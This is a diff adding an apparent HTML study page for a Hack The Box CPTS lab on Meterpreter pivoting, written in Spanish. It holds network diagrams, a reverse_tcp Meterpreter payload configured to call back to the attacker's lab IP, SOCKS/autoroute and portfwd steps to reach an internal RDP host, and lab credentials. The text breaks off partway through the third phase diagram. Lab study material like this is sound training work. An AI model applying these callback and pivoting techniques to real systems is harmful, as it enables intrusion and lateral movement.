@@ -1,0 +1,924 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>Meterpreter Tunneling Lab</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+
+<style>
+/* Layout: tabbed reference — topology diagrams on top, command table below */
+:root {
+  --bg: #0d1117;
+  --bg2: #161b22;
+  --bg3: #21262d;
+  --border: #30363d;
+  --fg: #e6edf3;
+  --fg2: #8b949e;
+  --fg3: #6e7681;
+  --accent: #58a6ff;
+  --accent2: #3d8bcd;
+  --green: #3fb950;
+  --red: #f85149;
+  --orange: #d29922;
+  --purple: #bc8cff;
+  --cyan: #39d353;
+  color-scheme: dark;
+}
+@media (prefers-color-scheme: light) {
+  :root:not([data-theme="dark"]) {
+    --bg: #ffffff;
+    --bg2: #f6f8fa;
+    --bg3: #eaeef2;
+    --border: #d0d7de;
+    --fg: #1f2328;
+    --fg2: #57606a;
+    --fg3: #818b98;
+    --accent: #0969da;
+    --accent2: #0550ae;
+    --green: #1a7f37;
+    --red: #cf222e;
+    --orange: #9a6700;
+    --purple: #8250df;
+    --cyan: #1a7f37;
+    color-scheme: light;
+  }
+}
+:root[data-theme="light"] {
+  --bg: #ffffff;
+  --bg2: #f6f8fa;
+  --bg3: #eaeef2;
+  --border: #d0d7de;
+  --fg: #1f2328;
+  --fg2: #57606a;
+  --fg3: #818b98;
+  --accent: #0969da;
+  --accent2: #0550ae;
+  --green: #1a7f37;
+  --red: #cf222e;
+  --orange: #9a6700;
+  --purple: #8250df;
+  --cyan: #1a7f37;
+  color-scheme: light;
+}
+
+*, *::before, *::after { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--fg);
+  font-family: 'Inter', system-ui, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  padding-left: max(16px, env(safe-area-inset-left, 0px));
+  padding-right: max(16px, env(safe-area-inset-right, 0px));
+  padding-block: 0 2rem;
+}
+
+/* Header */
+.header {
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  padding: 1rem max(16px, env(safe-area-inset-left, 0px));
+  margin: 0 calc(-1 * max(16px, env(safe-area-inset-left, 0px)));
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+  margin-bottom: 1.5rem;
+}
+.header-icon {
+  width: 32px; height: 32px;
+  background: linear-gradient(135deg, var(--accent), var(--purple));
+  border-radius: 8px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 16px; flex-shrink: 0;
+}
+.header h1 {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 1rem;
+  font-weight: 700;
+  margin: 0;
+  color: var(--fg);
+}
+.header-sub {
+  font-size: 0.75rem;
+  color: var(--fg2);
+  font-family: 'JetBrains Mono', monospace;
+}
+.theme-toggle {
+  margin-left: auto;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  color: var(--fg2);
+  border-radius: 6px;
+  padding: 0.3rem 0.6rem;
+  cursor: pointer;
+  font-size: 0.75rem;
+  font-family: 'Inter', sans-serif;
+}
+.theme-toggle:hover { color: var(--fg); border-color: var(--accent); }
+
+/* Tabs */
+.tabs {
+  display: flex;
+  gap: 0;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 1.5rem;
+  overflow-x: auto;
+}
+.tab {
+  padding: 0.6rem 1rem;
+  font-size: 0.8rem;
+  font-weight: 500;
+  color: var(--fg2);
+  border: none;
+  background: none;
+  cursor: pointer;
+  border-bottom: 2px solid transparent;
+  white-space: nowrap;
+  font-family: 'Inter', sans-serif;
+  transition: color 0.15s;
+}
+.tab:hover { color: var(--fg); }
+.tab.active {
+  color: var(--accent);
+  border-bottom-color: var(--accent);
+}
+
+.panel { display: none; }
+.panel.active { display: block; }
+
+/* Network Diagram */
+.diagram-section { margin-bottom: 2rem; }
+.section-title {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--fg2);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  margin-bottom: 0.75rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.section-title::after {
+  content: '';
+  flex: 1;
+  height: 1px;
+  background: var(--border);
+}
+
+.diagram-wrap {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+
+svg text { font-family: 'JetBrains Mono', monospace; }
+
+/* Legend */
+.legend {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem 1.25rem;
+  margin-top: 0.75rem;
+  font-size: 0.72rem;
+  color: var(--fg2);
+  font-family: 'JetBrains Mono', monospace;
+}
+.legend-item { display: flex; align-items: center; gap: 0.4rem; }
+.legend-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }
+.legend-line { width: 20px; height: 2px; flex-shrink: 0; }
+.legend-dash { width: 20px; height: 2px; background: repeating-linear-gradient(90deg, var(--orange) 0,var(--orange) 4px,transparent 4px,transparent 8px); flex-shrink: 0; }
+
+/* Command table */
+.cmd-table-wrap { overflow-x: auto; }
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.8rem;
+  min-width: 600px;
+}
+thead th {
+  background: var(--bg3);
+  color: var(--fg2);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.7rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  padding: 0.6rem 0.75rem;
+  text-align: left;
+  border-bottom: 1px solid var(--border);
+  white-space: nowrap;
+}
+tbody tr { border-bottom: 1px solid var(--border); }
+tbody tr:last-child { border-bottom: none; }
+tbody tr:hover { background: var(--bg2); }
+td {
+  padding: 0.65rem 0.75rem;
+  vertical-align: top;
+  color: var(--fg);
+}
+td:first-child {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 700;
+  color: var(--accent);
+  width: 42px;
+  text-align: center;
+  white-space: nowrap;
+}
+.host-badge {
+  display: inline-block;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.65rem;
+  font-weight: 600;
+  padding: 0.15rem 0.5rem;
+  border-radius: 4px;
+  white-space: nowrap;
+}
+.host-kali { background: rgba(88,166,255,0.15); color: var(--accent); border: 1px solid rgba(88,166,255,0.3); }
+.host-msf { background: rgba(188,140,255,0.15); color: var(--purple); border: 1px solid rgba(188,140,255,0.3); }
+.host-mtr { background: rgba(63,185,80,0.15); color: var(--green); border: 1px solid rgba(63,185,80,0.3); }
+.host-ubnt { background: rgba(210,153,34,0.15); color: var(--orange); border: 1px solid rgba(210,153,34,0.3); }
+
+code {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  background: var(--bg3);
+  padding: 0.1rem 0.35rem;
+  border-radius: 4px;
+  color: var(--cyan);
+  word-break: break-all;
+}
+.cmd-block {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 0.5rem 0.75rem;
+  margin: 0.25rem 0;
+  color: var(--cyan);
+  white-space: pre-wrap;
+  word-break: break-all;
+  line-height: 1.5;
+}
+.note {
+  font-size: 0.72rem;
+  color: var(--fg2);
+  margin-top: 0.3rem;
+  line-height: 1.4;
+}
+
+/* Phase headers in table */
+.phase-row td {
+  background: var(--bg3);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.7rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  color: var(--fg2);
+  padding: 0.4rem 0.75rem;
+  border-bottom: 1px solid var(--border);
+}
+.phase-row:hover { background: var(--bg3) !important; }
+
+/* Info boxes */
+.info-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 0.75rem;
+  margin-bottom: 1.5rem;
+}
+.info-card {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 0.75rem 1rem;
+}
+.info-card-label {
+  font-size: 0.65rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  color: var(--fg3);
+  margin-bottom: 0.25rem;
+}
+.info-card-value {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.85rem;
+  font-weight: 700;
+  color: var(--fg);
+}
+.info-card-sub {
+  font-size: 0.7rem;
+  color: var(--fg2);
+  margin-top: 0.1rem;
+}
+
+/* Scenario phases */
+.scenario-step {
+  display: flex;
+  gap: 1rem;
+  margin-bottom: 1rem;
+  align-items: flex-start;
+}
+.step-num {
+  width: 28px; height: 28px;
+  background: var(--accent2);
+  color: #fff;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  flex-shrink: 0;
+  margin-top: 0.1rem;
+}
+.step-body { flex: 1; min-width: 0; }
+.step-title {
+  font-weight: 600;
+  font-size: 0.85rem;
+  color: var(--fg);
+  margin-bottom: 0.2rem;
+}
+.step-desc {
+  font-size: 0.78rem;
+  color: var(--fg2);
+  line-height: 1.5;
+}
+</style>
+
+<div class="header">
+  <div class="header-icon">⚡</div>
+  <div>
+    <div class="header h1" style="margin:0;font-family:'JetBrains Mono',monospace;font-size:1rem;font-weight:700;">Meterpreter Tunneling Lab</div>
+    <div class="header-sub">HTB CPTS · Pivoting, Tunneling &amp; Port Forwarding</div>
+  </div>
+  <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle theme">◑ Theme</button>
+</div>
+
+<div class="tabs">
+  <button class="tab active" onclick="showPanel('topology')">① Topología de Red</button>
+  <button class="tab" onclick="showPanel('phases')">② Fases del Ataque</button>
+  <button class="tab" onclick="showPanel('commands')">③ Referencia de Comandos</button>
+</div>
+
+<!-- PANEL 1: Topology -->
+<div id="panel-topology" class="panel active">
+
+  <div class="info-grid">
+    <div class="info-card">
+      <div class="info-card-label">Atacante</div>
+      <div class="info-card-value" style="color:var(--accent)">10.10.14.18</div>
+      <div class="info-card-sub">Kali Linux · tun0 (HTB VPN)</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-label">Pivot / Ubuntu</div>
+      <div class="info-card-value" style="color:var(--orange)">10.129.202.64</div>
+      <div class="info-card-sub">172.16.5.129 · dual-homed</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-label">Target / Windows</div>
+      <div class="info-card-value" style="color:var(--red)">172.16.5.19</div>
+      <div class="info-card-sub">RDP 3389 · red interna</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-label">Red Interna</div>
+      <div class="info-card-value" style="color:var(--green)">172.16.4.0/23</div>
+      <div class="info-card-sub">172.16.4.0 – 172.16.5.255</div>
+    </div>
+  </div>
+
+  <div class="diagram-section">
+    <div class="section-title">Diagrama de red completo</div>
+    <div class="diagram-wrap">
+      <svg viewBox="0 0 760 340" width="100%" style="min-width:520px;max-width:760px;display:block;margin:auto;" role="img" aria-label="Diagrama de red del laboratorio">
+        <!-- Internet/VPN cloud -->
+        <ellipse cx="380" cy="50" rx="120" ry="28" fill="none" stroke="#30363d" stroke-width="1.5" stroke-dasharray="6,3"/>
+        <text x="380" y="46" text-anchor="middle" font-size="10" fill="#6e7681">HTB VPN</text>
+        <text x="380" y="60" text-anchor="middle" font-size="9" fill="#6e7681">10.10.0.0/16</text>
+
+        <!-- KALI box -->
+        <rect x="40" y="120" width="150" height="80" rx="8" fill="#161b22" stroke="#58a6ff" stroke-width="2"/>
+        <text x="115" y="143" text-anchor="middle" font-size="11" font-weight="700" fill="#58a6ff">KALI</text>
+        <text x="115" y="158" text-anchor="middle" font-size="9.5" fill="#e6edf3">10.10.14.18</text>
+        <text x="115" y="171" text-anchor="middle" font-size="8.5" fill="#8b949e">tun0 (HTB VPN)</text>
+        <text x="115" y="184" text-anchor="middle" font-size="8.5" fill="#8b949e">SOCKS :9050</text>
+
+        <!-- UBUNTU box -->
+        <rect x="300" y="120" width="160" height="90" rx="8" fill="#161b22" stroke="#d29922" stroke-width="2"/>
+        <text x="380" y="143" text-anchor="middle" font-size="11" font-weight="700" fill="#d29922">UBUNTU (Pivot)</text>
+        <text x="380" y="158" text-anchor="middle" font-size="9.5" fill="#e6edf3">10.129.202.64</text>
+        <text x="380" y="171" text-anchor="middle" font-size="8.5" fill="#8b949e">eth0 → HTB VPN</text>
+        <text x="380" y="184" text-anchor="middle" font-size="9.5" fill="#e6edf3">172.16.5.129</text>
+        <text x="380" y="197" text-anchor="middle" font-size="8.5" fill="#8b949e">eth1 → Red Interna</text>
+
+        <!-- WINDOWS box -->
+        <rect x="560" y="120" width="150" height="80" rx="8" fill="#161b22" stroke="#f85149" stroke-width="2"/>
+        <text x="635" y="143" text-anchor="middle" font-size="11" font-weight="700" fill="#f85149">WINDOWS</text>
+        <text x="635" y="158" text-anchor="middle" font-size="9.5" fill="#e6edf3">172.16.5.19</text>
+        <text x="635" y="171" text-anchor="middle" font-size="8.5" fill="#8b949e">Red Interna solo</text>
+        <text x="635" y="184" text-anchor="middle" font-size="8.5" fill="#8b949e">RDP :3389</text>
+
+        <!-- Internal network band -->
+        <rect x="440" y="108" width="330" height="104" rx="6" fill="rgba(63,185,80,0.04)" stroke="#3fb950" stroke-width="1" stroke-dasharray="5,3"/>
+        <text x="750" y="124" text-anchor="end" font-size="9" fill="#3fb950">172.16.4.0/23</text>
+
+        <!-- VPN connections up -->
+        <line x1="115" y1="120" x2="310" y2="78" stroke="#58a6ff" stroke-width="1.5" stroke-dasharray="4,2"/>
+        <line x1="380" y1="120" x2="380" y2="78" stroke="#d29922" stroke-width="1.5" stroke-dasharray="4,2"/>
+
+        <!-- Meterpreter connection: Kali ↔ Ubuntu -->
+        <line x1="190" y1="162" x2="300" y2="162" stroke="#58a6ff" stroke-width="2.5"/>
+        <polygon points="296,157 306,162 296,167" fill="#58a6ff"/>
+        <text x="245" y="155" text-anchor="middle" font-size="8.5" fill="#58a6ff" font-weight="600">Meterpreter</text>
+        <text x="245" y="166" text-anchor="middle" font-size="8" fill="#6e7681">:8080 TCP</text>
+
+        <!-- autoroute + SOCKS arrow (logical) -->
+        <path d="M 115 200 Q 115 260 380 260 Q 580 260 635 200" fill="none" stroke="#bc8cff" stroke-width="1.5" stroke-dasharray="6,3"/>
+        <polygon points="631,196 641,200 631,204" fill="#bc8cff"/>
+        <text x="380" y="275" text-anchor="middle" font-size="8.5" fill="#bc8cff">autoroute + SOCKS proxy (tráfico tunnelado)</text>
+        <text x="380" y="287" text-anchor="middle" font-size="8" fill="#6e7681">proxychains → :9050 → Meterpreter → Ubuntu → Intranet</text>
+
+        <!-- portfwd arrow (direct) -->
+        <path d="M 115 200 Q 240 310 380 310 Q 540 310 635 210" fill="none" stroke="#39d353" stroke-width="1.5" stroke-dasharray="3,3"/>
+        <text x="380" y="324" text-anchor="middle" font-size="8.5" fill="#39d353">portfwd add: Kali :3300 → 172.16.5.19:3389</text>
+
+        <!-- Internal segment arrow: Ubuntu → Windows -->
+        <line x1="460" y1="162" x2="560" y2="162" stroke="#d29922" stroke-width="2"/>
+        <polygon points="556,157 566,162 556,167" fill="#d29922"/>
+        <text x="510" y="156" text-anchor="middle" font-size="8.5" fill="#d29922">Red Interna</text>
+        <text x="510" y="168" text-anchor="middle" font-size="8" fill="#6e7681">172.16.x.x</text>
+      </svg>
+    </div>
+    <div class="legend">
+      <div class="legend-item"><div class="legend-dot" style="background:var(--accent)"></div>Kali (Atacante)</div>
+      <div class="legend-item"><div class="legend-dot" style="background:var(--orange)"></div>Ubuntu (Pivot)</div>
+      <div class="legend-item"><div class="legend-dot" style="background:var(--red)"></div>Windows (Target)</div>
+      <div class="legend-item"><div class="legend-line" style="background:var(--accent)"></div>Meterpreter :8080</div>
+      <div class="legend-item"><div class="legend-dash"></div>autoroute + SOCKS</div>
+      <div class="legend-item"><div class="legend-line" style="background:var(--green)"></div>portfwd :3300→:3389</div>
+    </div>
+  </div>
+
+  <div class="diagram-section">
+    <div class="section-title">Diagrama de puertos y servicios</div>
+    <div class="diagram-wrap">
+      <svg viewBox="0 0 760 220" width="100%" style="min-width:520px;max-width:760px;display:block;margin:auto;" role="img" aria-label="Mapa de puertos del laboratorio">
+        <!-- Kali ports -->
+        <rect x="20" y="20" width="180" height="180" rx="8" fill="rgba(88,166,255,0.06)" stroke="#58a6ff" stroke-width="1.5"/>
+        <text x="110" y="42" text-anchor="middle" font-size="10.5" font-weight="700" fill="#58a6ff">KALI · 10.10.14.18</text>
+        <!-- port entries -->
+        <rect x="34" y="52" width="152" height="22" rx="4" fill="#21262d"/>
+        <text x="44" y="67" font-size="9" fill="#39d353">:8080</text>
+        <text x="88" y="67" font-size="8.5" fill="#8b949e">multi/handler (recv)</text>
+        <rect x="34" y="80" width="152" height="22" rx="4" fill="#21262d"/>
+        <text x="44" y="95" font-size="9" fill="#bc8cff">:9050</text>
+        <text x="88" y="95" font-size="8.5" fill="#8b949e">socks_proxy (server)</text>
+        <rect x="34" y="108" width="152" height="22" rx="4" fill="#21262d"/>
+        <text x="44" y="123" font-size="9" fill="#39d353">:3300</text>
+        <text x="88" y="123" font-size="8.5" fill="#8b949e">portfwd → Win:3389</text>
+        <rect x="34" y="136" width="152" height="22" rx="4" fill="#21262d"/>
+        <text x="44" y="151" font-size="8.5" fill="#6e7681">proxychains</text>
+        <text x="110" y="151" font-size="8" fill="#6e7681">→ :9050</text>
+        <rect x="34" y="164" width="152" height="22" rx="4" fill="#21262d"/>
+        <text x="44" y="179" font-size="8.5" fill="#6e7681">xfreerdp</text>
+        <text x="93" y="179" font-size="8" fill="#6e7681">localhost:3300</text>
+
+        <!-- Ubuntu ports -->
+        <rect x="280" y="20" width="200" height="180" rx="8" fill="rgba(210,153,34,0.06)" stroke="#d29922" stroke-width="1.5"/>
+        <text x="380" y="42" text-anchor="middle" font-size="10.5" font-weight="700" fill="#d29922">UBUNTU · Pivot</text>
+        <rect x="294" y="52" width="172" height="22" rx="4" fill="#21262d"/>
+        <text x="304" y="67" font-size="9" fill="#f85149">eth0</text>
+        <text x="332" y="67" font-size="8.5" fill="#8b949e">10.129.202.64 / HTB</text>
+        <rect x="294" y="80" width="172" height="22" rx="4" fill="#21262d"/>
+        <text x="304" y="95" font-size="9" fill="#39d353">eth1</text>
+        <text x="332" y="95" font-size="8.5" fill="#8b949e">172.16.5.129 / Interna</text>
+        <rect x="294" y="108" width="172" height="22" rx="4" fill="#21262d"/>
+        <text x="304" y="123" font-size="9" fill="#bc8cff">backupjob</text>
+        <text x="368" y="123" font-size="8.5" fill="#8b949e">payload → :8080</text>
+        <rect x="294" y="136" width="172" height="22" rx="4" fill="#21262d"/>
+        <text x="304" y="151" font-size="8.5" fill="#6e7681">autoroute</text>
+        <text x="362" y="151" font-size="8" fill="#6e7681">172.16.5.0/23 via sess1</text>
+        <rect x="294" y="164" width="172" height="22" rx="4" fill="#21262d"/>
+        <text x="304" y="179" font-size="8.5" fill="#6e7681">ping_sweep</text>
+        <text x="366" y="179" font-size="8" fill="#6e7681">ejecuta EN Ubuntu</text>
+
+        <!-- Windows ports -->
+        <rect x="560" y="20" width="180" height="180" rx="8" fill="rgba(248,81,73,0.06)" stroke="#f85149" stroke-width="1.5"/>
+        <text x="650" y="42" text-anchor="middle" font-size="10.5" font-weight="700" fill="#f85149">WINDOWS · Target</text>
+        <rect x="574" y="52" width="152" height="22" rx="4" fill="#21262d"/>
+        <text x="584" y="67" font-size="9" fill="#f85149">:3389</text>
+        <text x="614" y="67" font-size="8.5" fill="#8b949e">RDP (solo intranet)</text>
+        <rect x="574" y="80" width="152" height="22" rx="4" fill="#21262d"/>
+        <text x="584" y="95" font-size="9" fill="#6e7681">usuario</text>
+        <text x="626" y="95" font-size="8.5" fill="#8b949e">victor / pass@123</text>
+        <text x="650" y="130" text-anchor="middle" font-size="8" fill="#6e7681">No accesible</text>
+        <text x="650" y="143" text-anchor="middle" font-size="8" fill="#6e7681">directamente desde Kali</text>
+        <text x="650" y="156" text-anchor="middle" font-size="8" fill="#6e7681">— requiere pivot</text>
+
+        <!-- arrows between boxes -->
+        <!-- Kali → Ubuntu: Meterpreter -->
+        <line x1="200" y1="90" x2="280" y2="90" stroke="#58a6ff" stroke-width="2"/>
+        <polygon points="276,85 286,90 276,95" fill="#58a6ff"/>
+        <text x="240" y="84" text-anchor="middle" font-size="8" fill="#58a6ff">:8080</text>
+
+        <!-- Ubuntu → Windows: internal -->
+        <line x1="480" y1="90" x2="560" y2="90" stroke="#d29922" stroke-width="2"/>
+        <polygon points="556,85 566,90 556,95" fill="#d29922"/>
+        <text x="520" y="84" text-anchor="middle" font-size="8" fill="#d29922">intranet</text>
+
+        <!-- Kali portfwd → Windows (curved) -->
+        <path d="M 200 130 Q 380 195 560 130" fill="none" stroke="#39d353" stroke-width="1.5" stroke-dasharray="4,3"/>
+        <polygon points="556,126 566,130 558,136" fill="#39d353"/>
+        <text x="380" y="200" text-anchor="middle" font-size="8" fill="#39d353">portfwd: :3300 → :3389</text>
+      </svg>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL 2: Attack Phases -->
+<div id="panel-phases" class="panel">
+
+  <div class="diagram-section">
+    <div class="section-title">Fase 1 — Comprometer el Pivot</div>
+    <div class="diagram-wrap">
+      <svg viewBox="0 0 700 100" width="100%" style="min-width:400px;max-width:700px;display:block;margin:auto;" role="img" aria-label="Fase 1: comprometer pivot">
+        <!-- Steps -->
+        <circle cx="60" cy="50" r="22" fill="#21262d" stroke="#58a6ff" stroke-width="2"/>
+        <text x="60" y="46" text-anchor="middle" font-size="9" fill="#8b949e">msfvenom</text>
+        <text x="60" y="58" text-anchor="middle" font-size="9" fill="#58a6ff">genera ELF</text>
+
+        <line x1="82" y1="50" x2="118" y2="50" stroke="#30363d" stroke-width="1.5" marker-end="url(#arr)"/>
+
+        <circle cx="140" cy="50" r="22" fill="#21262d" stroke="#58a6ff" stroke-width="2"/>
+        <text x="140" y="46" text-anchor="middle" font-size="9" fill="#8b949e">multi/</text>
+        <text x="140" y="58" text-anchor="middle" font-size="9" fill="#58a6ff">handler</text>
+
+        <line x1="162" y1="50" x2="198" y2="50" stroke="#30363d" stroke-width="1.5" marker-end="url(#arr)"/>
+
+        <circle cx="220" cy="50" r="22" fill="#21262d" stroke="#d29922" stroke-width="2"/>
+        <text x="220" y="46" text-anchor="middle" font-size="9" fill="#8b949e">sube &amp; exec</text>
+        <text x="220" y="58" text-anchor="middle" font-size="9" fill="#d29922">Ubuntu</text>
+
+        <line x1="242" y1="50" x2="278" y2="50" stroke="#30363d" stroke-width="1.5" marker-end="url(#arr)"/>
+
+        <circle cx="300" cy="50" r="22" fill="#21262d" stroke="#39d353" stroke-width="2"/>
+        <text x="300" y="46" text-anchor="middle" font-size="9" fill="#8b949e">sessión</text>
+        <text x="300" y="58" text-anchor="middle" font-size="9" fill="#39d353">Meterp. 1</text>
+
+        <!-- Annotation -->
+        <rect x="380" y="22" width="300" height="56" rx="6" fill="rgba(88,166,255,0.08)" stroke="#58a6ff" stroke-width="1" stroke-dasharray="3,2"/>
+        <text x="390" y="40" font-size="8.5" fill="#8b949e">Payload: linux/x64/meterpreter/reverse_tcp</text>
+        <text x="390" y="54" font-size="8.5" fill="#8b949e">LHOST=10.10.14.18  LPORT=8080</text>
+        <text x="390" y="68" font-size="8.5" fill="#8b949e">La sesión abre el canal de control Kali↔Ubuntu</text>
+
+        <defs>
+          <marker id="arr" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L6,3 z" fill="#58a6ff"/>
+          </marker>
+        </defs>
+      </svg>
+    </div>
+  </div>
+
+  <div class="diagram-section">
+    <div class="section-title">Fase 2 — Configurar el Túnel (SOCKS + autoroute)</div>
+    <div class="diagram-wrap">
+      <svg viewBox="0 0 700 160" width="100%" style="min-width:400px;max-width:700px;display:block;margin:auto;" role="img" aria-label="Fase 2: configurar tunel">
+        <!-- Components -->
+        <rect x="20" y="30" width="130" height="100" rx="8" fill="rgba(88,166,255,0.08)" stroke="#58a6ff" stroke-width="1.5"/>
+        <text x="85" y="52" text-anchor="middle" font-size="10" font-weight="700" fill="#58a6ff">KALI</text>
+        <text x="85" y="68" text-anchor="middle" font-size="8.5" fill="#8b949e">socks_proxy</text>
+        <text x="85" y="80" text-anchor="middle" font-size="8.5" fill="#bc8cff">:9050</text>
+        <text x="85" y="96" text-anchor="middle" font-size="8.5" fill="#8b949e">proxychains</text>
+        <text x="85" y="108" text-anchor="middle" font-size="8.5" fill="#8b949e">nmap / tools</text>
+        <text x="85" y="120" text-anchor="middle" font-size="8.5" fill="#8b949e">autoroute</text>
+
+        <!-- Arrow Kali to MSF -->
+        <line x1="150" y1="80" x2="195" y2="80" stroke="#bc8cff" stroke-width="1.5"/>
+        <polygon points="191,75 201,80 191,85" fill="#bc8cff"/>
+        <text x="173" y="74" text-anchor="middle" font-size="7.5" fill="#bc8cff">SOCKS4a</text>
+
+        <rect x="200" y="30" width="140" height="100" rx="8" fill="rgba(188,140,255,0.08)" stroke="#bc8cff" stroke-width="1.5"/>
+        <text x="270" y="52" text-anchor="middle" font-size="10" font-weight="700" fill="#bc8cff">MSF Routing</text>
+        <text x="270" y="70" text-anchor="middle" font-size="8.5" fill="#8b949e">tabla de rutas interna</text>
+        <text x="270" y="84" text-anchor="middle" font-size="8.5" fill="#8b949e">172.16.5.0/23</text>
+        <text x="270" y="98" text-anchor="middle" font-size="8.5" fill="#8b949e">via Session 1</text>
+        <text x="270" y="114" text-anchor="middle" font-size="8.5" fill="#6e7681">(no confundir con</text>
+        <text x="270" y="124" text-anchor="middle" font-size="8.5" fill="#6e7681">tabla del OS)</text>
+
+        <line x1="340" y1="80" x2="385" y2="80" stroke="#d29922" stroke-width="1.5"/>
+        <polygon points="381,75 391,80 381,85" fill="#d29922"/>
+        <text x="363" y="74" text-anchor="middle" font-size="7.5" fill="#d29922">session 1</text>
+
+        <rect x="390" y="30" width="140" height="100" rx="8" fill="rgba(210,153,34,0.08)" stroke="#d29922" stroke-width="1.5"/>
+        <text x="460" y="52" text-anchor="middle" font-size="10" font-weight="700" fill="#d29922">UBUNTU</text>
+        <text x="460" y="70" text-anchor="middle" font-size="8.5" fill="#8b949e">172.16.5.129</text>
+        <text x="460" y="84" text-anchor="middle" font-size="8.5" fill="#8b949e">acceso intranet</text>
+        <text x="460" y="98" text-anchor="middle" font-size="8.5" fill="#6e7681">ejecuta post/modules</text>
+        <text x="460" y="112" text-anchor="middle" font-size="8.5" fill="#6e7681">directamente (nativo)</text>
+
+        <line x1="530" y1="80" x2="575" y2="80" stroke="#f85149" stroke-width="1.5" stroke-dasharray="4,2"/>
+        <polygon points="571,75 581,80 571,85" fill="#f85149"/>
+
+        <rect x="580" y="30" width="100" height="100" rx="8" fill="rgba(248,81,73,0.08)" stroke="#f85149" stroke-width="1.5"/>
+        <text x="630" y="52" text-anchor="middle" font-size="10" font-weight="700" fill="#f85149">WINDOWS</text>
+        <text x="630" y="68" text-anchor="middle" font-size="8.5" fill="#8b949e">172.16.5.19</text>
+        <text x="630" y="84" text-anchor="middle" font-size="8.5" fill="#8b949e">:3389 RDP</text>
+        <text x="630" y="100" text-anchor="middle" font-size="8.5" fill="#6e7681">accesible via</text>
+        <text x="630" y="112" text-anchor="middle" font-size="8.5" fill="#6e7681">túnel/portfwd</text>
+      </svg>
+    </div>
+  </div>
+
+  <div class="diagram-section">
+    <div class="section-title">Fase 3 — Port Forward local (:3300 → :3389)</div>
+    <div class="diagram-wrap">
+      <svg viewBox="0 0 700 120" width="100%" style="min-width:400px;max-width:700px;display:block;margin:auto;" role="img" aria-label="Fase 3: port forward">
+        <!-- Kali local port -->
+        <rect x="20" y="30" width="150" height="60" rx="8" fill="rgba(88,166,255,0.08)" stroke="#58a6ff" stroke-width="1.5"/>
+        <text x="95" y="52" text-anchor="middle" font-size="10" font-weight="700" fill="#58a6ff">KALI</text>
+        <text x="95" y="67" text-anchor="middle" font-size="9" fill="#8b949e">localhost:3300</text>
+        <text x="95" y="80" text-anchor="middle" font-size="8" fill="#6e7681">xfreerdp /v:localhost:3300</text>
+
+        <!-- Arrow -->
+        <line x1="170" y1="60" x2="230" y2="60" stroke="#39d353" stroke-width="2"/>
+        <polygon points="226,55 236,60 226,65" fill="#39d353"/>
+        <text x="200" y="52" text-anchor="middle" font-size="8" fill="#39d353">portfwd add</text>
+        <text x="200" y="78" text-anchor="middle" font-size="7.5" fill="#6e7681">-l 3300 -p 3389 -r</text>
+
+        <!-- MSF Tunnel -->
+        <rect x="235" y="30" width="150" height="60" rx="8" fill="rgba(188,140,255,0.08)" stroke="#bc8cff" stroke-width="1.5"/>
+        <text x="310" y="52" text-anchor="middle" font-size="10" font-weight="700" fill="#bc8cff">MSF Tunnel</text>
+        <text x="310" y="67" text-anchor="middle" font-size="9" fill="#8b949e">Session 1</text>
+        <text x="310" y="80" text-anchor="middle" font-size="8" fill="#6e7681">pasa por Ubuntu</text>
+
+        <!-- Arrow -->
+        <line x1="385" y1="60" x2="445" y2="60" stroke="#39d353" stroke-width="2"/>
+        <polygon points="441,55 451,60 441,65" fill="#39d353"/>
+
